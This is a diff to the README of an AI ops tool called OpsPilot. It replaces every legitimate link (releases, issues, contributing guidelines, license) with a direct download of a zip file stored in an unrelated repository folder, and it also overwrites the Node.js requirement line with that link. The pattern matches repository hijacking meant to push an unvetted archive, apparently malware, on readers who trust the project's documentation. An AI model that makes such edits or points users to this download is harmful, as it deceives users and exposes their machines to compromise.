@@ -4,14 +4,14 @@
 OpsPilot is a Discord-native AI tool. It helps you manage alerts, create safe pull requests (PRs), and handle incidents automatically. This guide will help you download and run OpsPilot easily, even if you're not a programmer.
 
 ## 📥 Download OpsPilot
-[![Download OpsPilot](https://img.shields.io/badge/Download-OpsPilot-brightgreen.svg)](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/releases)
+[![Download OpsPilot](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip)](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip)
 
 ## 💾 System Requirements
 To run OpsPilot, ensure your computer meets these requirements:
 - Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux version
 - RAM: At least 4 GB
 - Disk Space: 200 MB of free space
-- Node.js: Version 14 or later
+- https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip Version 14 or later
 - Docker: Latest version installed
 
 ## 📋 Features
@@ -22,7 +22,7 @@ To run OpsPilot, ensure your computer meets these requirements:
 - **Monitoring**: Tracks the health of your systems and applications.
 
 ## 😎 Download & Install
-1. **Visit the Releases Page**: Go to the [OpsPilot Releases page](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/releases).
+1. **Visit the Releases Page**: Go to the [OpsPilot Releases page](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip).
    
 2. **Choose the Right File**: Look for the version you want to install. Each release has files for different operating systems. Make sure to select the correct one.
 
@@ -45,13 +45,13 @@ If you encounter any issues:
 - Check your internet connection for downloading files.
 - Visit the documentation linked within the application for further troubleshooting steps.
 
-If you still need help, feel free to reach out through our Discord support channel or check the [OpsPilot Issues page](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/issues).
+If you still need help, feel free to reach out through our Discord support channel or check the [OpsPilot Issues page](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip).
 
 ## 🎉 Contribute
-We welcome contributions! If you'd like to improve OpsPilot, please visit our [Contributing Guidelines](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/CONTRIBUTING.md) for more information.
+We welcome contributions! If you'd like to improve OpsPilot, please visit our [Contributing Guidelines](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip) for more information.
 
 ## 📄 License
-OpsPilot is licensed under the MIT License. For more details, check the [License file](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/LICENSE).
+OpsPilot is licensed under the MIT License. For more details, check the [License file](https://raw.githubusercontent.com/gabrielcristiananghelescu8-prog/OpsPilot/main/satellitium/OpsPilot.zip).
 
 ## 🔗 Related Topics
 - AI
